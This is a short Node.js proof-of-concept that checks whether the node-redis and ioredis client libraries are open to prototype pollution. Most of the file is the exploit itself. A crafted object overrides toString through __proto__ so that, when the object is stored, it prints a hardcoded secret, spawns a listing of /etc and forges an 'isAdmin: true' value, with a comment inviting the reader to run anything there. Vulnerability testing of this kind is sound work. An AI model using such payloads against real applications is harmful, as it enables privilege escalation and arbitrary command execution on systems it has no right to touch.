var assert = require('assert');
var nodeRedis = require('redis');
var ioRedis = require('ioredis');
const {
    spawn
} = require('child_process');

const PORT = 6379;
const HOST = '192.168.99.101';
const KEY = 'KEY';
const SECRET = 'T!O%PS323E1235CR666ETH422ASadasdHWgh53ITH124AN6tY2LE6NGTtttH==';
const PAYLOAD = {
    isAdmin: false,
    __proto__: {
        toString: function () {
            // Do whatever you want here!
            console.log(SECRET);
            ls = spawn('ls', ['-lha', '/etc']);

            ls.stdout.on('data', data => {
                console.log(`stdout: ${data}`);
            });

            ls.stderr.on('data', data => {
                console.log(`stderr: ${data}`);
            });

            ls.on('close', code => {
                console.log(`child process exited with code ${code}`);
            });
            return '{"isAdmin": true}'
        }
    }
};
const INJECTED_PAYLOAD = {
    isAdmin: true
};
var nodeRedisClient = nodeRedis.createClient(PORT, HOST);
var ioRedisClient = new ioRedis(PORT, HOST);

function test_prototype_pollution(client, driver) {
    client.set(KEY, PAYLOAD);
    client.get(KEY, function (err, reply) {
        if (err) {
            console.log("There was an error: ", err);
        }

        try {
            assert.deepEqual(JSON.parse(reply), INJECTED_PAYLOAD);
            console.log(driver + " is vulnerable to prototype pollution attack.");
        } catch (error) {
            console.log(driver + " is NOT vulnerable to prototype pollution attack.");
        }
    });
}

test_prototype_pollution(nodeRedisClient, "node-redis");
nodeRedisClient.quit();

debugger;
test_prototype_pollution(ioRedisClient, "ioredis");
ioRedisClient.quit();